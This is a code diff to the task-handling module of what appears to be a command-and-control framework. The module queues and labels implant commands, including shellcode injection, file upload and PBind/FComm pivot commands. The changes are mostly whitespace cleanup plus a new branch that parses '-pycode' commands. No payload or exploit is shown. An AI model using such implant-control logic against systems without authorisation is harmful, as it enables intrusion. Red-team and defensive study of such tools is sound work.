@@ -92,11 +92,11 @@ def newTaskOutput(uriPath, cookieVal, post_data, wsclient=False):
                 newImplant.save()
                 newImplant.display()
                 newImplant.autoruns()
-                if "pbind-command run-exe PBind PBind start" in executedCmd: 
+                if "pbind-command run-exe PBind PBind start" in executedCmd:
                     DB.new_task("pbind-pivot-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
                 else:
                     DB.new_task("pbind-loadmodule Stage2-Core.exe", "autoruns", RandomURI)
-                    
+
             elif "fcomm-connect " in executedCmd and "FComm-Connected" in outputParsed:
                 outputParsed = re.search("FComm-Connected:.*", outputParsed)
                 outputParsed = outputParsed[0].replace("FComm-Connected: ", "")
@@ -255,6 +255,11 @@ def newTask(path):
                     if (command.lower().startswith("$shellcode64")) or (command.lower().startswith("$shellcode86") or command.lower().startswith("run-exe core.program core inject-shellcode") or command.lower().startswith("run-exe pbind pbind run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-command run-exe core.program core inject-shellcode") or command.lower().startswith("pbind-pivot-command run-exe core.program core inject-shellcode")):
                         user_command = "Inject Shellcode: %s" % command[command.index("#") + 1:]
                         command = command[:command.index("#")]
+                    elif " -pycode " in command.lower():
+                        split_command = command.strip().split()
+                        args = split_command[3:]
+                        module = split_command[0]
+                        user_command = module + " " + " ".join(args)
                     elif (command.lower().startswith('upload-file') or command.lower().startswith('pbind-command upload-file') or command.lower().startswith('fcomm-command upload-file')):
                         PBind = False
                         FComm = False
@@ -350,7 +355,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()                            
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-command run-exe Program PS "):
                         try:
                             cmd = (task[2]).replace("pbind-command run-exe Program PS ", "")
@@ -453,7 +458,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()                        
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-connect"):
                         command = command.replace("pbind-connect ", "run-exe PBind PBind start ")
                     elif task[2].startswith("pbind-kill"):
@@ -499,7 +504,7 @@ def newTask(path):
                         except Exception as e:
                             print("Cannot base64 the command for PS")
                             print(e)
-                            traceback.print_exc()  
+                            traceback.print_exc()
                     elif task[2].startswith("pbind-pivot-connect"):
                         command = command.replace("pbind-pivot-connect ", "run-exe PBind PBind run-exe PBind PBind start ")
                     elif task[2].startswith("pbind-pivot-kill"):
